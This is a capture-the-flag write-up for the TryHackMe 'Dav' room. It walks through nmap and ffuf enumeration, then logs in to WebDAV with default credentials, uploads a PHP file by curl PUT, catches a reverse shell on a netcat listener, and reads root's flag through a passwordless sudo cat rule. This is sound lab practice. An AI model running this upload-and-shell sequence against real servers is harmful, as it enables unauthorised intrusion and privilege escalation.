## Dav
https://tryhackme.com/room/bsidesgtdav

## Enum
```
nmap -Pn -sC -sV 10.10.124.38 -vv

Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)

Nmap done: 1 IP address (1 host up) scanned in 22.21 seconds
           Raw packets sent: 1089 (47.916KB) | Rcvd: 1089 (43.564KB)
```

```
ffuf -u http://ip.thm/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
________________________________________________

.htpasswd               [Status: 403, Size: 290, Words: 22, Lines: 12, Duration: 2258ms]
.htaccess               [Status: 403, Size: 290, Words: 22, Lines: 12, Duration: 4242ms]
.hta                    [Status: 403, Size: 285, Words: 22, Lines: 12, Duration: 5242ms]
index.html              [Status: 200, Size: 11321, Words: 3503, Lines: 376, Duration: 425ms]
server-status           [Status: 403, Size: 294, Words: 22, Lines: 12, Duration: 421ms]
webdav                  [Status: 401, Size: 453, Words: 42, Lines: 15, Duration: 423ms]
:: Progress: [4713/4713] :: Job [1/1] :: 96 req/sec :: Duration: [0:00:53] :: Errors: 0 ::
```

```
curl ip.thm/webdav/ -v

*   Trying 10.10.69.137:80...
* Connected to ip.thm (10.10.69.137) port 80 (#0)
> GET /webdav/ HTTP/1.1
> Host: ip.thm
> User-Agent: curl/7.85.0
> Accept: */*
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 401 Unauthorized
< Server: Apache/2.4.18 (Ubuntu)
< WWW-Authenticate: Basic realm="webdav"
< Content-Length: 453
< Content-Type: text/html; charset=iso-8859-1
<
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>401 Unauthorized</title>
</head><body>
<h1>Unauthorized</h1>
<p>This server could not verify that you
are authorized to access the document
requested.  Either you supplied the wrong
credentials (e.g., bad password), or your
browser doesn't understand how to supply
the credentials required.</p>
<hr>
<address>Apache/2.4.18 (Ubuntu) Server at ip.thm Port 80</address>
</body></html>
* Connection #0 to host ip.thm left intact
```
🏴 I'm so stucked and checked writeups to find the basic auth credential.

wampp:xampp

![image](https://user-images.githubusercontent.com/6504854/192490541-b3fc6fa3-c21f-4f77-908e-4d6999802c06.png)

![image](https://user-images.githubusercontent.com/6504854/192491113-45354e5a-45e0-4f47-8d50-2bfe8b2e80c6.png)

```
curl -u wampp:xampp -X PUT http://ip.thm/webdav/1.php -F upfile=@1.php -v

*   Trying 10.10.69.137:80...
* Connected to ip.thm (10.10.69.137) port 80 (#0)
* Server auth using Basic with user 'wampp'
> PUT /webdav/1.php HTTP/1.1
> Host: ip.thm
> Authorization: Basic d2FtcHA6eGFtcHA=
> User-Agent: curl/7.85.0
> Accept: */*
> Content-Length: 3655
> Content-Type: multipart/form-data; boundary=------------------------e9ebfb04859efe10
>
* We are completely uploaded and fine
* Mark bundle as not supporting multiuse
< HTTP/1.1 204 No Content
< Server: Apache/2.4.18 (Ubuntu)
<
* Connection #0 to host ip.thm left intact
```

```
nc -lnvp 4444

curl -u wampp:xampp http://ip.thm/webdav/1.php
```

## Flag
```
nc -lnvp 4444
listening on [any] 4444 ...

Linux ubuntu 4.4.0-159-generic #187-Ubuntu SMP Thu Aug 1 16:28:06 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 03:00:02 up  2:58,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off

$ python3 -c 'import pty; pty.spawn("/bin/bash")';
www-data@ubuntu:/$ ls /home
ls /home
merlin  wampp

ls -la /home/merlin
total 44
drwxr-xr-x 4 merlin merlin 4096 Aug 25  2019 .
drwxr-xr-x 4 root   root   4096 Aug 25  2019 ..
-rw------- 1 merlin merlin 2377 Aug 25  2019 .bash_history
-rw-r--r-- 1 merlin merlin  220 Aug 25  2019 .bash_logout
-rw-r--r-- 1 merlin merlin 3771 Aug 25  2019 .bashrc
drwx------ 2 merlin merlin 4096 Aug 25  2019 .cache
-rw------- 1 merlin merlin   68 Aug 25  2019 .lesshst
drwxrwxr-x 2 merlin merlin 4096 Aug 25  2019 .nano
-rw-r--r-- 1 merlin merlin  655 Aug 25  2019 .profile
-rw-r--r-- 1 merlin merlin    0 Aug 25  2019 .sudo_as_admin_successful
-rw-r--r-- 1 root   root    183 Aug 25  2019 .wget-hsts
-rw-rw-r-- 1 merlin merlin   33 Aug 25  2019 user.txt

www-data@ubuntu:/$ cat /home/merlin/user.txt
cat /home/merlin/user.txt
44****************************a

www-data@ubuntu:/$ sudo -l
sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (ALL) NOPASSWD: /bin/cat
www-data@ubuntu:/$ sudo cat /root/root.txt

sudo cat /root/root.txt
10**************************5
www-data@ubuntu:/$
```

Thank you for your time. Happy Hacking 🌏🌏🌏

同じ時代に生まれた命、仲良く生きていきたいものですね。 🙏

